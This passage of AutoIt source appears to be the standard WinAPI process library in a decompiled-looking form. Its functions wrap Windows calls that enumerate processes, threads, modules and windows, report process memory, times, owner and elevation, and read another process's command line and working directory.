                $aret[$i][0x1] = _WinAPI_GetModuleFileNameEx($hprocess[0x0], $aret[$i][0x0])
            Next
        Until 0x1
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess[0x0])
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $aret
    EndFunc    ; -> _WinAPI_EnumProcessModules

    Func _WinAPI_EnumProcessThreads($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hsnapshot = DllCall("kernel32.dll", "handle", "CreateToolhelp32Snapshot", "dword", 0x4, "dword", 0x0)
        If @error Or Not $hsnapshot[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local Const $TAGTHREADENTRY32 = "dword Size;dword Usage;dword ThreadID;dword OwnerProcessID;long BasePri;long DeltaPri;dword Flags"
        Local $tthreadentry32 = DllStructCreate($TAGTHREADENTRY32)
        Local $aret[0x65] = [0x0]
        $hsnapshot = $hsnapshot[0x0]
        DllStructSetData($tthreadentry32, "Size", DllStructGetSize($tthreadentry32))
        Local $acall = DllCall("kernel32.dll", "bool", "Thread32First", "handle", $hsnapshot, "struct*", $tthreadentry32)
        While Not @error And $acall[0x0]
            If DllStructGetData($tthreadentry32, "OwnerProcessID") = $ipid Then
                __Inc($aret)
                $aret[$aret[0x0]] = DllStructGetData($tthreadentry32, "ThreadID")
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "Thread32Next", "handle", $hsnapshot, "struct*", $tthreadentry32)
        WEnd
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hsnapshot)
        If Not $aret[0x0] Then Return SetError(0x1, 0x0, 0x0)
        __Inc($aret, + -1)
        Return $aret
    EndFunc    ; -> _WinAPI_EnumProcessThreads

    Func _WinAPI_EnumProcessWindows($ipid = 0x0, $BVISIBLE = True)
        Local $athreads = _WinAPI_EnumProcessThreads($ipid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $henumproc = DllCallbackRegister("__EnumWindowsProc", "bool", "hwnd;lparam")
        Dim $__g_venum[0x65][0x2] = [[0x0]]
        For $i = 0x1 To $athreads[0x0]
            DllCall("user32.dll", "bool", "EnumThreadWindows", "dword", $athreads[$i], "ptr", DllCallbackGetPtr($henumproc), "lparam", $BVISIBLE)
            If @error Then
                ExitLoop
            EndIf
        Next
        DllCallbackFree($henumproc)
        If Not $__g_venum[0x0][0x0] Then Return SetError(0xb, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumProcessWindows

    Func _WinAPI_FatalAppExit($smessage)
        DllCall("kernel32.dll", "none", "FatalAppExitW", "uint", 0x0, "wstr", $smessage)
        If @error Then Return SetError(@error, @extended)
    EndFunc    ; -> _WinAPI_FatalAppExit

    Func _WinAPI_GetCurrentProcessExplicitAppUserModelID()
        Local $acall = DllCall("shell32.dll", "long", "GetCurrentProcessExplicitAppUserModelID", "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Local $sid = _WinAPI_GetString($acall[0x1])
        _WinAPI_CoTaskMemFree($acall[0x1])
        Return $sid
    EndFunc    ; -> _WinAPI_GetCurrentProcessExplicitAppUserModelID

    Func _WinAPI_GetCurrentProcessID()
        Local $acall = DllCall("kernel32.dll", "dword", "GetCurrentProcessId")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCurrentProcessID

    Func _WinAPI_GetCurrentThread()
        Local $acall = DllCall("kernel32.dll", "handle", "GetCurrentThread")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCurrentThread

    Func _WinAPI_GetCurrentThreadId()
        Local $acall = DllCall("kernel32.dll", "dword", "GetCurrentThreadId")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCurrentThreadId

    Func _WinAPI_GetDeviceDriverBaseName($pdriver)
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "dword", "GetDeviceDriverBaseNameW", "ptr", $pdriver, "wstr", '', "dword", 0x1000)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetDeviceDriverBaseName

    Func _WinAPI_GetDeviceDriverFileName($pdriver)
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "dword", "GetDeviceDriverFileNameW", "ptr", $pdriver, "wstr", '', "dword", 0x1000)
        If @error Then Return SetError(@error, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetDeviceDriverFileName

    Func _WinAPI_GetExitCodeProcess($hprocess)
        Local $acall = DllCall("kernel32.dll", "bool", "GetExitCodeProcess", "handle", $hprocess, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetExitCodeProcess

    Func _WinAPI_GetGuiResources($iflag = 0x0, $hprocess = + -1)
        If $hprocess = + -1 Then $hprocess = _WinAPI_GetCurrentProcess()
        Local $acall = DllCall("user32.dll", "dword", "GetGuiResources", "handle", $hprocess, "dword", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetGuiResources

    Func _WinAPI_GetModuleFileNameEx($hprocess, $hmodule = 0x0)
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "dword", "GetModuleFileNameExW", "handle", $hprocess, "handle", $hmodule, "wstr", '', "int", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_GetModuleFileNameEx

    Func _WinAPI_GetModuleInformation($hprocess, $hmodule = 0x0)
        Local $tmoduleinfo = DllStructCreate($TAGMODULEINFO)
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "GetModuleInformation", "handle", $hprocess, "handle", $hmodule, "struct*", $tmoduleinfo, "dword", DllStructGetSize($tmoduleinfo))
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tmoduleinfo
    EndFunc    ; -> _WinAPI_GetModuleInformation

    Func _WinAPI_GetParentProcess($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hsnapshot = DllCall("kernel32.dll", "handle", "CreateToolhelp32Snapshot", "dword", 0x2, "dword", 0x0)
        If @error Or Not $hsnapshot[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tprocessentry32 = DllStructCreate($TAGPROCESSENTRY32)
        Local $iresult = 0x0
        $hsnapshot = $hsnapshot[0x0]
        DllStructSetData($tprocessentry32, "Size", DllStructGetSize($tprocessentry32))
        Local $acall = DllCall("kernel32.dll", "bool", "Process32FirstW", "handle", $hsnapshot, "struct*", $tprocessentry32)
        Local $ierror = @error
        While (Not @error) And ($acall[0x0])
            If DllStructGetData($tprocessentry32, "ProcessID") = $ipid Then
                $iresult = DllStructGetData($tprocessentry32, "ParentProcessID")
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "Process32NextW", "handle", $hsnapshot, "struct*", $tprocessentry32)
            $ierror = @error
        WEnd
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hsnapshot)
        If Not $iresult Then Return SetError($ierror, 0x0, 0x0)
        Return $iresult
    EndFunc    ; -> _WinAPI_GetParentProcess

    Func _WinAPI_GetPriorityClass($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x400  : 0x1000), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $ierror = 0x0
        Local $acall = DllCall("kernel32.dll", "dword", "GetPriorityClass", "handle", $hprocess[0x0])
        If @error Then $ierror = @error
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess[0x0])
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetPriorityClass

    Func _WinAPI_GetProcessAffinityMask($hprocess)
        Local $acall = DllCall("kernel32.dll", "bool", "GetProcessAffinityMask", "handle", $hprocess, "dword_ptr*", 0x0, "dword_ptr*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $amask[0x3]
        $amask[0x0] = True
        $amask[0x1] = $acall[0x2]
        $amask[0x2] = $acall[0x3]
        Return $amask
    EndFunc    ; -> _WinAPI_GetProcessAffinityMask

    Func _WinAPI_GetProcessCommandLine($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x410  : 0x1010), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, '')
        $hprocess = $hprocess[0x0]
        Local $tpbi = DllStructCreate("ulong_ptr ExitStatus;ptr PebBaseAddress;ulong_ptr AffinityMask;ulong_ptr BasePriority;ulong_ptr UniqueProcessId;ulong_ptr InheritedFromUniqueProcessId")
        Local $tpeb = DllStructCreate("byte InheritedAddressSpace;byte ReadImageFileExecOptions;byte BeingDebugged;byte Spare;ptr Mutant;ptr ImageBaseAddress;ptr LoaderData;ptr ProcessParameters;ptr " & _
            "SubSystemData;ptr ProcessHeap;ptr FastPebLock;ptr FastPebLockRoutine;ptr FastPebUnlockRoutine;ulong EnvironmentUpdateCount;ptr KernelCallbackTable;ptr EventLogS" & _
            "ection;ptr EventLog;ptr FreeList;ulong TlsExpansionCounter;ptr TlsBitmap;ulong TlsBitmapBits[2];ptr ReadOnlySharedMemoryBase;ptr ReadOnlySharedMemoryHeap;ptr Re" & _
            "adOnlyStaticServerData;ptr AnsiCodePageData;ptr OemCodePageData;ptr UnicodeCaseTableData;ulong NumberOfProcessors;ulong NtGlobalFlag;byte Spare2[4];int64 Critic" & _
            "alSectionTimeout;ulong HeapSegmentReserve;ulong HeapSegmentCommit;ulong HeapDeCommitTotalFreeThreshold;ulong HeapDeCommitFreeBlockThreshold;ulong NumberOfHeaps;" & _
            "ulong MaximumNumberOfHeaps;ptr ProcessHeaps;ptr GdiSharedHandleTable;ptr ProcessStarterHelper;ptr GdiDCAttributeList;ptr LoaderLock;ulong OSMajorVersion;ulong O" & _
            "SMinorVersion;ulong OSBuildNumber;ulong OSPlatformId;ulong ImageSubSystem;ulong ImageSubSystemMajorVersion;ulong ImageSubSystemMinorVersion;ulong GdiHandleBuffe" & _
            "r[34];ulong PostProcessInitRoutine;ulong TlsExpansionBitmap;byte TlsExpansionBitmapBits[128];ulong SessionId")
        Local $tupp = DllStructCreate("ulong AllocationSize;ulong ActualSize;ulong Flags;ulong Unknown1;ushort LengthUnknown2;ushort MaxLengthUnknown2;ptr Unknown2;ptr InputHandle;ptr OutputHandle;pt" & _
            "r ErrorHandle;ushort LengthCurrentDirectory;ushort MaxLengthCurrentDirectory;ptr CurrentDirectory;ptr CurrentDirectoryHandle;ushort LengthSearchPaths;ushort Max" & _
            "LengthSearchPaths;ptr SearchPaths;ushort LengthApplicationName;ushort MaxLengthApplicationName;ptr ApplicationName;ushort LengthCommandLine;ushort MaxLengthComm" & _
            "andLine;ptr CommandLine;ptr EnvironmentBlock;ulong Unknown[9];ushort LengthUnknown3;ushort MaxLengthUnknown3;ptr Unknown3;ushort LengthUnknown4;ushort MaxLength" & _
            "Unknown4;ptr Unknown4;ushort LengthUnknown5;ushort MaxLengthUnknown5;ptr Unknown5")
        Local $tcmd
        Local $acall, $ierror = 0x0
        Do
            $acall = DllCall("ntdll.dll", "long", "NtQueryInformationProcess", "handle", $hprocess, "ulong", 0x0, "struct*", $tpbi, "ulong", DllStructGetSize($tpbi), "ulong*", 0x0)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", DllStructGetData($tpbi, "PebBaseAddress"), "struct*", $tpeb, "ulong_ptr", DllStructGetSize($tpeb), "ulong_ptr*", 0x0)
            If @error Or Not $acall[0x0] Or (Not $acall[0x5]) Then
                $ierror = @error + 0x28
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", DllStructGetData($tpeb, "ProcessParameters"), "struct*", $tupp, "ulong_ptr", DllStructGetSize($tupp), "ulong_ptr*", 0x0)
            If @error Or Not $acall[0x0] Or (Not $acall[0x5]) Then
                $ierror = @error + 0x32
                ExitLoop
            EndIf
            $tcmd = DllStructCreate("byte[" & DllStructGetData($tupp, "MaxLengthCommandLine") & "]")
            If @error Then
                $ierror = @error + 0x3c
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", DllStructGetData($tupp, "CommandLine"), "struct*", $tcmd, "ulong_ptr", DllStructGetSize($tcmd), "ulong_ptr*", 0x0)
            If @error Or Not $acall[0x0] Or (Not $acall[0x5]) Then
                $ierror = @error + 0x46
                ExitLoop
            EndIf
        Until 0x1
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess)
        If $ierror Then Return SetError($ierror, 0x0, '')
        Return StringStripWS(_WinAPI_PathGetArgs(_WinAPI_GetString(DllStructGetPtr($tcmd, 0x1))), $STR_STRIPLEADING + $STR_STRIPTRAILING)
    EndFunc    ; -> _WinAPI_GetProcessCommandLine

    Func _WinAPI_GetProcessFileName($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x410  : 0x1010), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, '')
        Local $spath = _WinAPI_GetModuleFileNameEx($hprocess[0x0])
        Local $ierror = @error
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess[0x0])
        If $ierror Then Return SetError(@error, 0x0, '')
        Return $spath
    EndFunc    ; -> _WinAPI_GetProcessFileName

    Func _WinAPI_GetProcessHandleCount($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x400  : 0x1000), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "GetProcessHandleCount", "handle", $hprocess[0x0], "dword*", 0x0)
        If __CheckErrorCloseHandle($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetProcessHandleCount

    Func _WinAPI_GetProcessID($hprocess)
        Local $acall = DllCall("kernel32.dll", "dword", "GetProcessId", "handle", $hprocess)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetProcessID

    Func _WinAPI_GetProcessIoCounters($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x400  : 0x1000), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tio_counters = DllStructCreate("uint64[6]")
        Local $acall = DllCall("kernel32.dll", "bool", "GetProcessIoCounters", "handle", $hprocess[0x0], "struct*", $tio_counters)
        If __CheckErrorCloseHandle($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, 0x0)
        Local $aret[0x6]
        For $i = 0x0 To 0x5
            $aret[$i] = DllStructGetData($tio_counters, 0x1, $i + 0x1)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetProcessIoCounters

    Func _WinAPI_GetProcessMemoryInfo($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x410  : 0x1010), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tpmc_ex = DllStructCreate("dword;dword;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr")
        Local $acall = DllCall(@SystemDir & "\\psapi.dll", "bool", "GetProcessMemoryInfo", "handle", $hprocess[0x0], "struct*", $tpmc_ex, "int", DllStructGetSize($tpmc_ex))
        If __CheckErrorCloseHandle($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, 0x0)
        Local $aret[0xa]
        For $i = 0x0 To 0x9
            $aret[$i] = DllStructGetData($tpmc_ex, $i + 0x2)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetProcessMemoryInfo

    Func _WinAPI_GetProcessName($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hsnapshot = DllCall("kernel32.dll", "handle", "CreateToolhelp32Snapshot", "dword", 0x2, "dword", 0x0)
        If @error Or Not $hsnapshot[0x0] Then Return SetError(@error + 0x14, @extended, '')
        $hsnapshot = $hsnapshot[0x0]
        Local $tprocessentry32 = DllStructCreate($TAGPROCESSENTRY32)
        DllStructSetData($tprocessentry32, "Size", DllStructGetSize($tprocessentry32))
        Local $acall = DllCall("kernel32.dll", "bool", "Process32FirstW", "handle", $hsnapshot, "struct*", $tprocessentry32)
        Local $ierror = @error
        While (Not @error) And ($acall[0x0])
            If DllStructGetData($tprocessentry32, "ProcessID") = $ipid Then
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "Process32NextW", "handle", $hsnapshot, "struct*", $tprocessentry32)
            $ierror = @error
        WEnd
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hsnapshot)
        If $ierror Then Return SetError($ierror, 0x0, '')
        If Not $acall[0x0] Then SetError(0xa, 0x0, '')
        Return DllStructGetData($tprocessentry32, "ExeFile")
    EndFunc    ; -> _WinAPI_GetProcessName

    Func _WinAPI_GetProcessTimes($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x400  : 0x1000), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tfiletime = DllStructCreate($TAGFILETIME)
        Local $acall = DllCall("kernel32.dll", "bool", "GetProcessTimes", "handle", $hprocess[0x0], "struct*", $tfiletime, "uint64*", 0x0, "uint64*", 0x0, "uint64*", 0x0)
        If __CheckErrorCloseHandle($acall, $hprocess[0x0]) Then Return SetError(@error, @extended, 0x0)
        Local $aret[0x3]
        $aret[0x0] = $tfiletime
        $aret[0x1] = $acall[0x4]
        $aret[0x2] = $acall[0x5]
        Return $aret
    EndFunc    ; -> _WinAPI_GetProcessTimes

    Func _WinAPI_GetProcessUser($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $tsid, $htoken, $acall
        Local $ierror = 0x0
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x400  : 0x1000), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        Do
            $htoken = _WinAPI_OpenProcessToken(0x8, $hprocess[0x0])
            If Not $htoken Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
            $tsid = DllStructCreate("ptr;byte[1024]")
            $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "uint", 0x1, "struct*", $tsid, "dword", DllStructGetSize($tsid), "dword*", 0x0)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            $acall = DllCall("advapi32.dll", "bool", "LookupAccountSidW", "ptr", 0x0, "ptr", DllStructGetData($tsid, 0x1), "wstr", '', "dword*", 0x800, "wstr", '', "dword*", 0x800, "uint*", 0x0)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x28
                ExitLoop
            EndIf
        Until 0x1
        If $htoken Then
            DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $htoken)
        EndIf
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess[0x0])
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Local $aret[0x2]
        $aret[0x0] = $acall[0x3]
        $aret[0x1] = $acall[0x5]
        Return $aret
    EndFunc    ; -> _WinAPI_GetProcessUser

    Func _WinAPI_GetProcessWorkingDirectory($ipid = 0x0)
        If Not $ipid Then $ipid = @AutoItPID
        Local $acall, $ierror = 0x0
        Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", ((_WinAPI_GetVersion() < 6) ? 0x410  : 0x1010), "bool", 0x0, "dword", $ipid)
        If @error Or Not $hprocess[0x0] Then Return SetError(@error + 0x14, @extended, '')
        $hprocess = $hprocess[0x0]
        Local $tpbi = DllStructCreate("ulong_ptr ExitStatus;ptr PebBaseAddress;ulong_ptr AffinityMask;ulong_ptr BasePriority;ulong_ptr UniqueProcessId;ulong_ptr InheritedFromUniqueProcessId")
        Local $tpeb = DllStructCreate("byte InheritedAddressSpace;byte ReadImageFileExecOptions;byte BeingDebugged;byte Spare;ptr Mutant;ptr ImageBaseAddress;ptr LoaderData;ptr ProcessParameters;ptr " & _
            "SubSystemData;ptr ProcessHeap;ptr FastPebLock;ptr FastPebLockRoutine;ptr FastPebUnlockRoutine;ulong EnvironmentUpdateCount;ptr KernelCallbackTable;ptr EventLogS" & _
            "ection;ptr EventLog;ptr FreeList;ulong TlsExpansionCounter;ptr TlsBitmap;ulong TlsBitmapBits[2];ptr ReadOnlySharedMemoryBase;ptr ReadOnlySharedMemoryHeap;ptr Re" & _
            "adOnlyStaticServerData;ptr AnsiCodePageData;ptr OemCodePageData;ptr UnicodeCaseTableData;ulong NumberOfProcessors;ulong NtGlobalFlag;byte Spare2[4];int64 Critic" & _
            "alSectionTimeout;ulong HeapSegmentReserve;ulong HeapSegmentCommit;ulong HeapDeCommitTotalFreeThreshold;ulong HeapDeCommitFreeBlockThreshold;ulong NumberOfHeaps;" & _
            "ulong MaximumNumberOfHeaps;ptr ProcessHeaps;ptr GdiSharedHandleTable;ptr ProcessStarterHelper;ptr GdiDCAttributeList;ptr LoaderLock;ulong OSMajorVersion;ulong O" & _
            "SMinorVersion;ulong OSBuildNumber;ulong OSPlatformId;ulong ImageSubSystem;ulong ImageSubSystemMajorVersion;ulong ImageSubSystemMinorVersion;ulong GdiHandleBuffe" & _
            "r[34];ulong PostProcessInitRoutine;ulong TlsExpansionBitmap;byte TlsExpansionBitmapBits[128];ulong SessionId")
        Local $tupp = DllStructCreate("ulong AllocationSize;ulong ActualSize;ulong Flags;ulong Unknown1;ushort LengthUnknown2;ushort MaxLengthUnknown2;ptr Unknown2;ptr InputHandle;ptr OutputHandle;pt" & _
            "r ErrorHandle;ushort LengthCurrentDirectory;ushort MaxLengthCurrentDirectory;ptr CurrentDirectory;ptr CurrentDirectoryHandle;ushort LengthSearchPaths;ushort Max" & _
            "LengthSearchPaths;ptr SearchPaths;ushort LengthApplicationName;ushort MaxLengthApplicationName;ptr ApplicationName;ushort LengthCommandLine;ushort MaxLengthComm" & _
            "andLine;ptr CommandLine;ptr EnvironmentBlock;ulong Unknown[9];ushort LengthUnknown3;ushort MaxLengthUnknown3;ptr Unknown3;ushort LengthUnknown4;ushort MaxLength" & _
            "Unknown4;ptr Unknown4;ushort LengthUnknown5;ushort MaxLengthUnknown5;ptr Unknown5")
        Local $tdir
        Do
            $acall = DllCall("ntdll.dll", "long", "NtQueryInformationProcess", "handle", $hprocess, "ulong", 0x0, "struct*", $tpbi, "ulong", DllStructGetSize($tpbi), "ulong*", 0x0)
            If @error Or ($acall[0x0]) Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", DllStructGetData($tpbi, "PebBaseAddress"), "struct*", $tpeb, "ulong_ptr", DllStructGetSize($tpeb), "ulong_ptr*", 0x0)
            If @error Or (Not $acall[0x0]) Or (Not $acall[0x5]) Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", DllStructGetData($tpeb, "ProcessParameters"), "struct*", $tupp, "ulong_ptr", DllStructGetSize($tupp), "ulong_ptr*", 0x0)
            If @error Or (Not $acall[0x0]) Or (Not $acall[0x5]) Then
                $ierror = @error + 0x28
                ExitLoop
            EndIf
            $tdir = DllStructCreate("byte[" & DllStructGetData($tupp, "MaxLengthCurrentDirectory") & "]")
            If @error Then
                $ierror = @error + 0x32
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", DllStructGetData($tupp, "CurrentDirectory"), "struct*", $tdir, "ulong_ptr", DllStructGetSize($tdir), "ulong_ptr*", 0x0)
            If @error Or (Not $acall[0x0]) Or (Not $acall[0x5]) Then
                $ierror = @error + 0x3c
                ExitLoop
            EndIf
            $ierror = 0x0
        Until 0x1
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hprocess)
        If $ierror Then Return SetError($ierror, 0x0, '')
        Return _WinAPI_PathRemoveBackslash(_WinAPI_GetString(DllStructGetPtr($tdir)))
    EndFunc    ; -> _WinAPI_GetProcessWorkingDirectory

    Func _WinAPI_GetThreadDesktop($ithreadid)
        Local $acall = DllCall("user32.dll", "handle", "GetThreadDesktop", "dword", $ithreadid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetThreadDesktop

    Func _WinAPI_GetThreadErrorMode()
        Local $acall = DllCall("kernel32.dll", "dword", "GetThreadErrorMode")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetThreadErrorMode

    Func _WinAPI_GetWindowFileName($hwnd)
        Local $ipid = 0x0
        Local $acall = DllCall("user32.dll", "bool", "IsWindow", "hwnd", $hwnd)
        If $acall[0x0] Then
            $acall = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0x0)
            $ipid = $acall[0x2]
        EndIf
        If Not $ipid Then Return SetError(0x1, 0x0, '')
        Local $sresult = _WinAPI_GetProcessFileName($ipid)
        If @error Then Return SetError(@error, @extended, '')
        Return $sresult
    EndFunc    ; -> _WinAPI_GetWindowFileName

    Func _WinAPI_IsElevated()
        Local $ielev, $acall, $ierror = 0x0
        Local $htoken = _WinAPI_OpenProcessToken(0x8)
        If Not $htoken Then Return SetError(@error + 0xa, @extended, False)
        Do
            $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "uint", 0x14, "uint*", 0x0, "dword", 0x4, "dword*", 0x0)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0xa
                ExitLoop
            EndIf
            $ielev = $acall[0x3]
            $acall = DllCall("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "uint", 0x12, "uint*", 0x0, "dword", 0x4, "dword*", 0x0)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x14
                ExitLoop
            EndIf
        Until 0x1
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $htoken)
        If $ierror Then Return SetError($ierror, 0x0, False)
        Return SetExtended($acall[0x0] + -1, $ielev)
    EndFunc    ; -> _WinAPI_IsElevated

    Func _WinAPI_IsProcessInJob($hprocess, $hjob = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "IsProcessInJob", "handle", $hprocess, "handle", $hjob, "bool*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_IsProcessInJob

    Func _WinAPI_OpenJobObject($sname, $iaccess = $JOB_OBJECT_ALL_ACCESS, $binherit = False)
        Local $acall = DllCall("kernel32.dll", "handle", "OpenJobObjectW", "dword", $iaccess, "bool", $binherit, "wstr", $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenJobObject

    Func _WinAPI_OpenMutex($smutex, $iaccess = $MUTEX_ALL_ACCESS, $binherit = False)
        Local $acall = DllCall("kernel32.dll", "handle", "OpenMutexW", "dword", $iaccess, "bool", $binherit, "wstr", $smutex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenMutex

    Func _WinAPI_OpenProcess($iaccess, $binherit, $ipid, $bdebugpriv = False)
        Local $acall = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $binherit, "dword", $ipid)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return $acall[0x0]
        If Not $bdebugpriv Then Return SetError(0x64, 0x0, 0x0)
        Local $htoken = _Security__OpenThreadTokenEx(BitOR($TOKEN_ADJUST_PRIVILEGES, $TOKEN_QUERY))
        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        _Security__SetPrivilege($htoken, $SE_DEBUG_NAME, True)
        Local $ierror = @error
        Local $iextended = @extended
